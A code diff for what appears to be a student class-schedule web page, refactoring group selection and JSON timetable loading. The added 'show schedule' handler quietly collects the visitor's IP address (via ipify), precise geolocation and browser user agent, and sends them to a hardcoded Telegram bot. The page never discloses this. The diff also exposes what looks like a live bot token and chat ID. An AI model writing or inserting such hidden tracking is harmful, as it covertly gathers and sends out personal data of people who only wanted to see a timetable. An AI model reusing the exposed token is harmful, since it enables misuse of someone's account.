@@ -1,141 +1,198 @@
-document.addEventListener('DOMContentLoaded', function() {
-  // Работа с выбором группы
+document.addEventListener("DOMContentLoaded", function() {
+  // Сначала наполняем список групп для выбранного курса
   const courseSelect = document.getElementById('course');
   const groupSelect = document.getElementById('group');
-  const showScheduleBtn = document.getElementById('show-schedule');
+  
+  // Функция для обновления списка групп в зависимости от курса
+  function updateGroups(course) {
+    let groups = [];
+    if (course === "1-course") {
+      groups = ["1-24", "2-24", "3-24", "4-24", "6-24", "7-24", "8-24", "9-24"];
+    } else if (course === "2-course") {
+      groups = ["1-23", "2-23", "3-23", "4-23", "5-23", "6-23", "7-23", "8-23", "9-23"];
+    }
 
-  const groups = {
-    '1-course': ['1-24', '2-24', '3-24', '4-24', '6-24', '7-24', '8-24', '9-24'],
-    '2-course': ['1-23', '2-23', '3-23', '4-23', '5-23', '6-23', '7-23', '8-23', '9-23']
-  };
-
-  // Обработчик изменения курса
-  courseSelect.addEventListener('change', function() {
-    const selectedCourse = courseSelect.value;
-    groupSelect.innerHTML = '';  // Сбросить текущие опции
-    groups[selectedCourse].forEach(function(group) {
+    // Очищаем список групп и добавляем новые опции
+    groupSelect.innerHTML = "";
+    groups.forEach(group => {
       const option = document.createElement('option');
       option.value = group;
-      option.textContent = group;
+      option.textContent = group.replace("-", " ");
       groupSelect.appendChild(option);
     });
+  }
+
+  // Обновляем группы при изменении курса
+  courseSelect.addEventListener('change', function() {
+    updateGroups(courseSelect.value);
   });
 
-  // Отображение расписания
-  showScheduleBtn.addEventListener('click', function() {
-    const selectedGroup = groupSelect.value;
-    const selectedDay = document.getElementById('day').value;
+  // Сначала обновляем группы для первого курса
+  updateGroups(courseSelect.value);
 
-    const scheduleTable = document.getElementById('schedule-table').getElementsByTagName('tbody')[0];
-    scheduleTable.innerHTML = ''; // Очистка текущей таблицы
+  // Обработчик для кнопки "Jadvalni ko'rsatish"
+  document.getElementById('show-schedule').addEventListener('click', function() {
+    const course = courseSelect.value;
+    const group = groupSelect.value;
+    const day = document.getElementById('day').value;
 
-    // Пример расписания
-    const scheduleData = {
-      '1-24': {
-        'Monday': [['Matematika', '9:00-10:30'], ['Informatika', '10:45-12:15']],
-        'Tuesday': [['Kimyo', '9:00-10:30'], ['Biologiya', '10:45-12:15']],
-      },
-      '2-24': {
-        'Monday': [['Fizika', '9:00-10:30'], ['Matematika', '10:45-12:15']],
-        'Tuesday': [['Informatika', '9:00-10:30'], ['Kimyo', '10:45-12:15']],
-      },
-      '1-23': {
-        'Monday': [['Informatika', '9:00-10:30'], ['Fizika', '10:45-12:15']],
-        'Tuesday': [['Biologiya', '9:00-10:30'], ['Matematika', '10:45-12:15']],
-      }
-    };
+    // Получаем IP-адрес пользователя с помощью ipify API
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const userIp = data.ip;  // Получаем IP-адрес
 
-    const selectedSchedule = scheduleData[selectedGroup] ? scheduleData[selectedGroup][selectedDay] : [];
+        // Получаем информацию о местоположении с помощью геолокации
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
 
-    selectedSchedule.forEach(function(session) {
-      const row = scheduleTable.insertRow();
-      const cell1 = row.insertCell(0);
-      const cell2 = row.insertCell(1);
-      cell1.textContent = session[0];
-      cell2.textContent = session[1];
-    });
+            // Получаем информацию о пользователе
+            const userAgent = navigator.userAgent;  // Информация о браузере и устройстве
+
+            // Формируем сообщение с курсом, группой, IP, местоположением и устройством
+            const message = `Sizning dasturingizni ochgan foydalanuvchi ma'lumotlari:\n\n` +
+                            `Kurs: ${course}\n` +
+                            `Guruh: ${group}\n` +
+                            `IP-manzil: ${userIp}\n` +
+                            `Maqom (latitude, longitude): ${latitude}, ${longitude}\n` +
+                            `Telefon/kompyuter: ${userAgent}`;
+
+            // Отправляем запрос на Telegram через Webhook
+            fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                chat_id: '7518382960',  // Ваш Telegram ID или ID группы
+                text: message
+              })
+            })
+            .then(response => response.json())
+            .then(data => {
+              console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+              console.error('Error:', error);
+            });
+
+          }, function(error) {
+            console.error('Ошибка при получении местоположения:', error);
+          });
+        } else {
+          alert("Geolokatsiya xizmati qo\'llab-quvvatlanmayapti.");
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching IP address:', error);
+      });
+
+    // Загружаем расписание
+    fetch(`courses/${course}/${group}.json`)
+      .then(response => response.json())
+      .then(data => {
+        const schedule = data[day];
+        
+        // Получаем таблицу и очищаем её
+        const tableBody = document.getElementById('schedule-table').getElementsByTagName('tbody')[0];
+        tableBody.innerHTML = "";
+
+        // Заполняем таблицу уроками
+        if (schedule) {
+          schedule.forEach(lesson => {
+            const row = tableBody.insertRow();
+            const lessonCell = row.insertCell(0);
+            const timeCell = row.insertCell(1);
+            lessonCell.textContent = lesson.lesson;
+            timeCell.textContent = lesson.time;
+          });
+        } else {
+          const row = tableBody.insertRow();
+          const noLessonsCell = row.insertCell(0);
+          noLessonsCell.colSpan = 2;
+          noLessonsCell.textContent = "Uroklar bu kunda yo'q";
+        }
+      })
+      .catch(error => {
+        console.error('Xatolik:', error);
+        alert('Xatolik yuz berdi. Fayl manzili to\'g\'ri ekanligini tekshiring.');
+      });
   });
 
-  // Открытие и закрытие модального окна "Muallif haqida"
+  // Функция для открытия модального окна
   const authorBtn = document.getElementById('author-btn');
   const authorModal = document.getElementById('author-modal');
   const closeBtn = document.getElementById('close-btn');
-
-  authorBtn.addEventListener('click', function() {
-    authorModal.style.display = 'block';
-  });
-
-  closeBtn.addEventListener('click', function() {
-    authorModal.style.display = 'none';
-  });
-
-  window.addEventListener('click', function(event) {
-    if (event.target === authorModal) {
-      authorModal.style.display = 'none';
-    }
-  });
-
-  // Открытие и закрытие модального окна "Muallif-ga yozish"
   const contactBtn = document.getElementById('contact-btn');
   const contactModal = document.getElementById('contact-modal');
-  const closeContactBtn = document.getElementById('close-contact-btn');
+  const contactCloseBtn = document.getElementById('contact-close-btn');
+  const sendMessageBtn = document.getElementById('send-message');
+  
+  // Открытие модального окна о авторе
+  authorBtn.addEventListener('click', function() {
+    authorModal.style.display = "block";
+  });
 
+  // Закрытие модального окна о авторе
+  closeBtn.addEventListener('click', function() {
+    authorModal.style.display = "none";
+  });
+
+  // Открытие модального окна для связи с автором
   contactBtn.addEventListener('click', function() {
-    contactModal.style.display = 'block';
+    contactModal.style.display = "block";
   });
 
-  closeContactBtn.addEventListener('click', function() {
-    contactModal.style.display = 'none';
+  // Закрытие модального окна для связи с автором
+  contactCloseBtn.addEventListener('click', function() {
+    contactModal.style.display = "none";
   });
 
+  // Закрытие модальных окон при клике вне их
   window.addEventListener('click', function(event) {
+    if (event.target === authorModal) {
+      authorModal.style.display = "none";
+    }
     if (event.target === contactModal) {
-      contactModal.style.display = 'none';
+      contactModal.style.display = "none";
     }
   });
 
-  // Обработчик отправки сообщения через Telegram бота
-  const sendMessageBtn = document.getElementById('send-message-btn');
-
+  // Отправка сообщения автору
   sendMessageBtn.addEventListener('click', function() {
-    const name = document.getElementById('author-name').value.trim();
-    const phone = document.getElementById('author-phone').value.trim();
-    const telegram = document.getElementById('author-telegram').value.trim();
-    const message = document.getElementById('author-message').value.trim();
+    const name = document.getElementById('contact-name').value;
+    const phone = document.getElementById('contact-phone').value;
+    const telegram = document.getElementById('contact-telegram').value;
+    const message = document.getElementById('contact-message').value;
 
-    // Проверка на обязательные поля
-    if (name && phone && telegram && message) {
-      // Формирование сообщения для отправки в Telegram
-      const telegramMessage = `
-        Yangi xabar:
-        Ism: ${name}
-        Telefon: ${phone}
-        Telegram: ${telegram}
-        Xabar: ${message}
-      `;
+    const messageText = `Foydalanuvchi bilan bog'lanish ma'lumotlari:\n\n` +
+                        `Ism: ${name}\n` +
+                        `Telefon raqam: ${phone}\n` +
+                        `Telegram: ${telegram}\n` +
+                        `Xabar: ${message}`;
 
-      // URL для отправки сообщения через Telegram бота
-      const botToken = 'YOUR_BOT_TOKEN';
-      const chatId = 'YOUR_CHAT_ID';
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;
-
-      // Отправка запроса к Telegram API
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            alert('Xabar muvaffaqiyatli yuborildi!');
-            contactModal.style.display = 'none'; // Закрыть модальное окно после отправки
-          } else {
-            alert('Xabar yuborishda xatolik yuz berdi.');
-          }
-        })
-        .catch(error => {
-          console.error('Xatolik:', error);
-          alert('Xabar yuborishda xatolik yuz berdi.');
-        });
-    } else {
-      alert('Iltimos, barcha maydonlarni to\'ldiring.');
-    }
+    // Отправка данных на Telegram через Webhook
+    fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: '7518382960',  // Ваш Telegram ID или ID группы
+        text: messageText
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert('Xabar muvaffaqiyatli yuborildi!');
+      contactModal.style.display = "none";
+    })
+    .catch(error => {
+      alert('Xatolik yuz berdi!');
+      console.error('Error:', error);
+    });
   });
+
 });
